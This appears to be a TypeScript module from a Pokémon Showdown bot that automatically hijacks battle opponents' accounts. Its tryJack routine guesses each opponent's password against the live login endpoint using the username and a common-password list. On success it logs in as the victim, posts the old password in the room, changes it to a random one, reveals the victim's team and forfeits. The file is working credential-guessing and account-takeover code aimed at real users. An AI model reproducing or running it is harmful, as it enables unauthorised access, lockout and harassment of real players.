import fs = require('fs');
import * as request from 'request-promise-native';

import { LoginForm, Player } from './Player'
import { BattleData } from './BattleData';

import { Champ } from '../Shoedrip/Champ';

import { logger } from '../Backend/logger';

import { snooze, toId } from '../Website/utils';
import { commonPasswords } from '../commonPasswords';
import { settings } from '../Backend/settings';
import { ShowdownMon } from './ShowdownMon';
import { RoomID } from './PSRoom';
import InfoAggregator from './BattleHandlers/InfoAggregator';


let fakechal = '4|034a2f187c98af6da8790273cb5314157d922e1c932aeb6538f5b4c3acdb88809ffdb03f053014e7795a8725d27de1ebdd782ff612484918d0aa43caeab7c66586c83b95f456ccb996b6a94e9aeaa66f18773d401915da8f3899d2715d1dae309ff49c6ff9306ad4ae109be871efd078b69bf19a1b7cccff14976282996668a6';

let checkpass = async (user: string, pass: string) => {
	let data: LoginForm = new LoginForm;
	data.challstr = fakechal;
	data.act = 'login';
	data.name = user;
	data.pass = pass;
	let body = await request.post('http://play.pokemonshowdown.com/action.php', {
		form: data, proxy: settings.proxy
	});
	if (body[0] != ']')
		return false;
	body = body.substr(1);
	body = JSON.parse(body);
	if (body.assertion[0] == ';') {
		return false;
	}
	return true;
}

export let changePassword = async (user: string, sid: string, op: string, np: string) => {
	let data = new LoginForm;
	data.act = 'changepassword';
	data.oldpassword = op;
	data.password = data.cpassword = np;
	let body = await request.post('http://play.pokemonshowdown.com/action.php', {
		form: data,
		headers: {
			Cookie: `showdown_username=${toId(user)}; sid=${sid}`
		}
	});
}

export let isRegged = async (user: string) => {
	let data: LoginForm = new LoginForm;
	data.challstr = fakechal;
	data.act = 'getassertion';
	data.userid = user;
	let body = await request.post('http://play.pokemonshowdown.com/action.php', {
		form: data
	});
	if (body[0] == ';')
		return true;
	return false;
}

export class PlayerHijack {
	opponent: Champ;
	account?: Player;
	room: RoomID;
	bd: BattleData;
	constructor(battleData: BattleData, battlers: InfoAggregator['battlers']) {
		let alias: 'p1' | 'p2' = battleData.champ_alias![1] == '1' ? 'p2' : 'p1';
		this.room = battleData.roomid;
		this.bd = battleData;
		this.opponent = battlers[alias];
	}

	async tryJack(isRegged: boolean) {
		try {
			if (isRegged) {
				let passwords = [this.opponent.showdown_name, ...commonPasswords];
				for (let pass of passwords) {
					if (await checkpass(this.opponent.showdown_name, pass)) {
						this.account = new Player(this.opponent.showdown_name, pass);
						break;
					} else {
						console.log(pass + ' did not work');
					}
				}
			} else {
				this.account = new Player(this.opponent.showdown_name);
			}
			if (!this.account)
				return;
			//this.bot = new Player(settings.showdown.user, settings.showdown.pass);
			await this.account.connect();
			this.account.tryJoin(this.room);
			await snooze(1000);
			if (isRegged) {
				this.account.message(this.room, 'Changing password to randomly generated password, as a joke, haha...');
				this.account.message(this.room, `Password was ${this.account.pass}`);
				let newpass = [...new Array(~~(Math.random() * 9 + 9))].map(n => String.fromCharCode(~~(Math.random() * 26 + 65))).join('');
				console.log('Setting new pass of ', this.opponent.showdown_name, 'to', newpass);
				changePassword(this.account.user!, this.account.sid!, this.account.pass!, newpass);
				await snooze(1500);
			}
			if (this.account.con.challstrraw.indexOf(';') != -1)
				return;
			this.account.message(this.room, 'Hi, my name is J.A.C.K., brought to you by D*gars©');
			let myteam: ShowdownMon[] | undefined;
			while (!myteam) {
				// You never get a request from finished battles, so give up here
				if (this.bd.finished)
					return;
				myteam = await this.account.getMyTeam(this.room);
			}
			for (let mon of myteam) {
				let desc = [mon.details, mon.condition, mon.item, mon.baseAbility,
				Object.keys(mon.stats).map(k => `${k}: ${mon.stats[k]}`).join(' / '),
				mon.moves.join(', ')].join(' ');
				this.account.message(this.room, desc);
				await snooze(1500);
			}
			this.account.message(this.room, 'PERFECTLY HEALTHY');
			await snooze(1000);
			this.account.message(this.room, '/forfeit');
			await snooze(1000);
			console.log('end proper hijack of ', this.opponent.showdown_name, 'in room', this.room);
			this.account.disconnect();
		} catch (e) {
			console.log('Could not hijack the opponent:');
			console.log(e);
		}
	}
}
